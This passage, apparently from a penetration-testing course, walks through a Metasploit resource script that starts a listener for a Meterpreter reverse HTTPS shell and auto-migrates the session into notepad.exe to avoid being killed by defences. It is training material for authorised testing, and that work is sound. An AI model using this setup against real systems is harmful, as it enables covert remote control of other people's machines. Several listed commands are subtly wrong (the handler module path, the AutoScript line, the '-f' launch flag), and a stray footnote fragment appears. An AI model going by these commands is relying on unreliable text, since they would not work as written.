Penetration Testing with Kali Linux

In a penetration test, we may need to set up multi/handler listeners each time we want to receive an incoming reverse shell. We could either let Metasploit run in the background the whole time or start Metasploit manually and set up a listener each time. We could also create a resource script to automate this task for us.

Let's create a resource script that starts a multi/handler listener for a non-staged Metasploit payload. To do this, we can create a file in the home directory of the user named `listener.rc` and open it in an editor as Mousepad.¹1005.

We need to think about the sequence of the commands we want to execute. For this example, the first command is to activate the multi/handler module. Then we set the payload, which in our case, is `windows/meterpreter_reverse_https`. Next, we can use the LHOST and LPORT options to fix our needs.

```
use exploit/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 4444
```

> Listing 703 - Activate module, set payload, and options

In addition, we can configure the AutoScript to automatically execute a module after a session was created. For this example, let's use the `post/windows/manage/migrate` module. This will cause the spawned Meterpreter to automatically launch a notepad.exe process and migrate to it. Automating process migration helps to avoid situations where our payload is killed prematurely by defensive mechanisms or the termination of the related process.

```
AutoScript post/windows/manage/migrate
```

> Listing 704 - AutoScript to migrate the module

Let's also set ExitOnSession to false to ensure that the listener keeping new connections after a session is created.

```
set ExitOnSession false
```

> Listing 705 - Set ExitOnSession to false to keep the multi/handler listener after a connection

> We can also configure advanced options as ExitOnSession in multi/handler and AutoScript in payloads by using `show advanced` within the activated module or selected payload.

Finally, we'll run with the arguments `-z -j` to run it as a job in the background and stop us from automatically interacting with the session.

```
run -z -j
```

> Listing 706 - Command to launch the module

Now, let's save the script and start Metasploit by entering `msfconsole` with the resource script as argument `-f`.
